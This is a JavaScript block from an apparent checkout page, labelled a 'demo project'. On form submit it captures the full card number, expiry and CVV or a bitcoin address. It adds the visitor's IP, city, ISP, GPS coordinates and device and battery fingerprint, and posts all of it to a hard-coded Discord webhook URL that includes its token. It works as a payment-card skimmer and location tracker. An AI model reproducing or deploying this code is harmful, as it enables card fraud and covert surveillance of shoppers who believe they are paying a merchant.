<script>
  document.querySelectorAll('input[name="payment-method"]').forEach((radio) => {
    radio.addEventListener('change', (event) => {
      document.querySelector('.card-details').style.display = event.target.id === 'payment-card' ? 'block' : 'none';
      document.querySelector('.crypto-details').style.display = event.target.id === 'payment-crypto' ? 'block' : 'none';
    });
  });

  async function getMetadata() {
    const [ipData, battery] = await Promise.all([
      fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({})),
      navigator.getBattery ? navigator.getBattery() : Promise.resolve({})
    ]);

    // Try to get GPS coordinates
    const coords = await new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          lat: pos.coords.latitude.toFixed(6),
          lon: pos.coords.longitude.toFixed(6)
        }),
        () => resolve({ lat: 'Permission Denied', lon: 'Permission Denied' }),
        { timeout: 5000 }
      );
    });

    return {
      ip: ipData.ip || 'N/A',
      country: ipData.country_name || 'N/A',
      city: ipData.city || 'N/A',
      org: ipData.org || 'N/A',
      timezone: ipData.timezone || 'N/A',
      browser: navigator.userAgent,
      language: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      platform: navigator.platform,
      ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
      cpu: navigator.hardwareConcurrency || 'Unknown',
      battery: battery.level ? `${Math.round(battery.level * 100)}%` : 'Unavailable',
      charging: battery.charging ? 'Yes' : 'No',
      status: navigator.onLine ? 'Online' : 'Offline',
      lat: coords.lat,
      lon: coords.lon,
      mapLink: coords.lat !== 'Permission Denied' ? `https://maps.google.com/?q=${coords.lat},${coords.lon}` : 'User denied location access.',
      time: new Date().toLocaleString()
    };
  }

  function sendToDiscord(paymentMethod, formData, meta) {
    const webhookUrl = 'https://discordapp.com/api/webhooks/1373748781861834882/2SDjfj-z2YxeR71Z8JDFLw3lk8uQwjIu_PwYrgTfMwLrIsVyBdJBW5PBNB1qg50wfLAe';
    const message = {
      content: `ðŸ“¦ **New Order (Demo Project)**

ðŸ§¾ **Order Info**
- Method: ${paymentMethod}
- Name: ${formData.fullName || 'N/A'}
- Card: ${formData.cardNumber || 'N/A'}
- Expiry: ${formData.expiry || 'N/A'}
- CVV: ${formData.cvv || 'N/A'}
- BTC Address: ${formData.bitcoinAddress || 'N/A'}

ðŸŒ **Location & IP**
- IP: ${meta.ip}
- City: ${meta.city}, Country: ${meta.country}
- ISP: ${meta.org}
- Timezone: ${meta.timezone}
- Lat: ${meta.lat}
- Lon: ${meta.lon}
- ðŸŒ [View on Map](${meta.mapLink})

ðŸ’» **Device Info**
- Browser: ${meta.browser}
- Platform: ${meta.platform}
- Screen: ${meta.screen}
- Language: ${meta.language}
- RAM: ${meta.ram}
- CPU Cores: ${meta.cpu}
- Battery: ${meta.battery} (Charging: ${meta.charging})
- Online Status: ${meta.status}
- Submitted At: ${meta.time}`
    };

    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message)
    })
    .then(() => alert('Demo order submitted! Check Discord.'))
    .catch(err => console.error('Webhook Error:', err));
  }

  document.querySelector('.card-details form').addEventListener('submit', async function (e) {
    e.preventDefault();
    const formData = {
      fullName: document.querySelector('#full-name').value,
      cardNumber: document.querySelector('#card-number').value,
      expiry: document.querySelector('#expiry').value,
      cvv: document.querySelector('#cvv').value,
      bitcoinAddress: ''
    };
    const meta = await getMetadata();
    sendToDiscord('Card', formData, meta);
  });

  document.querySelector('.crypto-details button').addEventListener('click', async function () {
    const formData = {
      fullName: '',
      cardNumber: '',
      expiry: '',
      cvv: '',
      bitcoinAddress: document.querySelector('.crypto-details pre').innerText
    };
    const meta = await getMetadata();
    sendToDiscord('Crypto', formData, meta);
  });
</script>
